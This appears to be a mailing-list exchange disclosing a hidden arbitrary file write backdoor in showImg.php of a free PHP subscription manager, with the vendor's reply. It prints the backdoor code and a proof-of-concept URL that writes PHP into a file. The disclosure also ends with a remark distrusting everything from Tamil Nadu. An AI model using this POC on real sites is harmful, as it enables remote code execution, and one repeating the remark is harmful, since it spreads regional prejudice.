Hi,



The PHP is used for tracking open email report in Email Marketing
Software Express. It will not be called in any of your free
subscription manager PHPs.



I do not understand what you mean by don't trust obfuscated software
from Tamil Nadu. Do you think all products from Tamil Nadu is
unsafe/spam?



Thanks

Ganesan

EPractize Labs Online Subscription Manager
Free PHP Online Subscription Manager
Easy-to-use Subscription management that eases up your subscription
management. With Subscription Manager you can create subscription
forms, maintain subscription messages, send confirmation message
automatically, configure the subscription forms, load subscribers
list, View reports, integrate with Email Marketing Software to manage
contact list and campaign management. .

showImg.php passes through img.jpg, but also runs the following code
as a trivial arbitrary file write back door. It has nothing to do
with showing an image.

<?php
$reqOut="".$_GET['email'];
$reqDB="".$_GET['db'];
$in_fileStr = file_get_contents_me($reqDB);
$count =substr_count($in_fileStr,$reqOut);
if($count==0){
$finalStr="".$in_fileStr."\n".$reqOut."#".$today = date("F j, Y, g:i a");
$fT = @fopen($reqDB, 'wt');
fwrite($fT, $finalStr);
fclose($fT);
}
?>

POC: showImg.php?db=me.php&email=<?echo "hello"; ?>

Mitigation: Nobody seems to be using this junk.

Vendor status: cc with this mail. What were you thinking?

province. Actually, just don't trust obfuscated software, and don't
trust anything from Tamil Nadu.
